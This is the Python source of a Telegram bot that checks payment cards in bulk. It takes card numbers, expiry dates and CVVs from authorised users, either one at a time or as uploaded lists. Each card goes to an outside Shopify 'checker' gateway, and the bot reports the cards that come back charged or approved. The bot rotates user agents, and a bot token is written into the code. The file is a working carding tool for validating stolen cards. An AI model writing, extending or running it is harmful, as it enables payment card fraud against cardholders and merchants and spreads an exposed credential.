import telebot
import re
import threading
import time
import json
import requests
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# BOT Config
BOT_TOKEN = "6351415129:AAFmlLXocNHEJ1zykE4m-JJOVBpVAGbmGzg"
MAIN_ADMIN_ID = 5103348494
bot = telebot.TeleBot(BOT_TOKEN)

AUTHORIZED_USERS = {}

# ---------------- Helper Functions ---------------- #

def load_admins():
    try:
        with open("admins.json", "r") as f:
            return json.load(f)
    except:
        return [MAIN_ADMIN_ID]

def save_admins(admins):
    with open("admins.json", "w") as f:
        json.dump(admins, f)

def is_admin(chat_id):
    return chat_id in load_admins()

def load_auth():
    try:
        with open("authorized.json", "r") as f:
            return json.load(f)
    except:
        return {}

def save_auth(data):
    with open("authorized.json", "w") as f:
        json.dump(data, f)

def is_authorized(chat_id):
    if is_admin(chat_id):
        return True
    if str(chat_id) in AUTHORIZED_USERS:
        expiry = AUTHORIZED_USERS[str(chat_id)]
        if expiry == "forever" or time.time() < expiry:
            return True
        else:
            del AUTHORIZED_USERS[str(chat_id)]
            save_auth(AUTHORIZED_USERS)
    return False

def normalize_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = '20' + part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def generate_user_agent():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
    ])

# ---------------- Gateway Call ---------------- #

def check_card_gateway(cc_line):
    try:
        url = f"https://chk-for-shopify.onrender.com?lista={cc_line}"
        headers = {"User-Agent": generate_user_agent()}
        r = requests.get(url, headers=headers, timeout=20)
        return r.text.strip()
    except Exception as e:
        return f"❌ Error checking {cc_line}: {e}"

AUTHORIZED_USERS = load_auth()
ADMIN_IDS = load_admins()

# ---------------- Telegram Commands ---------------- #

@bot.message_handler(commands=["chk"])
def chk_handler(msg):
    if not is_authorized(msg.from_user.id):
        return bot.reply_to(msg, "❌ Not authorized.")

    cc = None
    if msg.reply_to_message:
        cc = normalize_card(msg.reply_to_message.text or "")
    else:
        args = msg.text.split(None, 1)
        if len(args) > 1:
            cc = normalize_card(args[1]) or args[1]

    if not cc:
        return bot.reply_to(msg, "❌ Invalid format. Use `/chk 4556737586899855|12|2026|123`")

    processing = bot.reply_to(msg, "🕒 Processing your card...")

    def run_check():
        result = check_card_gateway(cc)
        bot.edit_message_text(result, msg.chat.id, processing.message_id)

    threading.Thread(target=run_check).start()

@bot.message_handler(commands=["mchk"])
def mchk_handler(msg):
    if not is_authorized(msg.from_user.id):
        return bot.reply_to(msg, "❌ Not authorized.")

    if not msg.reply_to_message:
        return bot.reply_to(msg, "❌ Reply with a CC list file or text.")

    text = ""
    if msg.reply_to_message.document:
        file_info = bot.get_file(msg.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode("utf-8", errors="ignore")
    else:
        text = msg.reply_to_message.text or ""

    cc_lines = []
    for line in text.splitlines():
        norm = normalize_card(line.strip())
        if norm:
            cc_lines.append(norm)

    if not cc_lines:
        return bot.reply_to(msg, "❌ No valid cards found.")

    total = len(cc_lines)
    approved, declined, checked = 0, 0, 0

    kb = InlineKeyboardMarkup(row_width=1)
    status_msg = bot.send_message(msg.chat.id, f"🔄 Checking {total} cards...", reply_markup=kb)

    def process_cards():
        nonlocal approved, declined, checked
        for cc in cc_lines:
            checked += 1
            result = check_card_gateway(cc)
            if "CHARGED" in result or "CVV MATCH" in result or "APPROVED" in result:
                approved += 1
                bot.send_message(msg.chat.id, result)
            else:
                declined += 1

            new_kb = InlineKeyboardMarkup(row_width=1)
            new_kb.add(
                InlineKeyboardButton(f"Approved {approved} ✅", callback_data="none"),
                InlineKeyboardButton(f"Declined {declined} ❌", callback_data="none"),
                InlineKeyboardButton(f"Checked {checked}/{total}", callback_data="none")
            )
            bot.edit_message_reply_markup(msg.chat.id, status_msg.message_id, reply_markup=new_kb)
            time.sleep(2)

        bot.send_message(msg.chat.id, "✅ Mass check completed.")

    threading.Thread(target=process_cards).start()

print("🚀 Bot is running with chk.php backend (inline mass check enabled)...")
bot.infinity_polling()
